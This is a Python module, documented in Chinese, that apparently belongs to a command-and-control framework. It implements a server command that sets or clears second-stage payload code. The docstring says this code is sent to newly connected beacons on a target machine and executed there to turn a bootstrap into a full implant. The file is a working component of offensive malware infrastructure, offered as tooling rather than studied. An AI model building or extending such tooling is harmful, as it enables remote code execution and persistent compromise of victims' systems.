"""stage — 设定/清除分段载荷第二段代码(server 端):

stage <代码...>     设定第二段(新 beacon 首次上线下发, 引导代码 exec 后变完整植入物)
stage -clear       清除第二段(恢复单段部署)

配合: s_exec agent_stager 生成第一段(引导)部署命令——目标机执行引导 →
连 server 注册 → 收到本第二段(init 任务) → exec → 完整植入物以同 id 注册。
"""

import json
import os


def run(disp, args):
    if not args:
        cur = getattr(disp.config, "stage_code", "") or ""
        if cur:
            return f"[*] 当前第二段已设定 ({len(cur)} 字节):\n{cur[:200]}{'...' if len(cur) > 200 else ''}"
        return "[!] usage: stage <代码...> | stage -clear"
    if args[0] == "-clear":
        cfg_path = getattr(disp.config, "config_path", "") or ""
        disp.config.stage_code = ""
        if cfg_path and os.path.isfile(cfg_path):
            try:
                raw = json.load(open(cfg_path, encoding="utf-8"))
                raw["stage_code"] = ""
                json.dump(raw, open(cfg_path, "w", encoding="utf-8"),
                          indent=2, ensure_ascii=False)
            except OSError:
                pass
        return "[+] 第二段已清除(恢复单段部署)"
    code = " ".join(args)
    disp.config.stage_code = code
    cfg_path = getattr(disp.config, "config_path", "") or ""
    if cfg_path and os.path.isfile(cfg_path):
        try:
            raw = json.load(open(cfg_path, encoding="utf-8"))
            raw["stage_code"] = code
            json.dump(raw, open(cfg_path, "w", encoding="utf-8"),
                      indent=2, ensure_ascii=False)
        except OSError:
            pass
    return f"[+] 第二段已设定 ({len(code)} 字节), 新 beacon 首次上线下发"
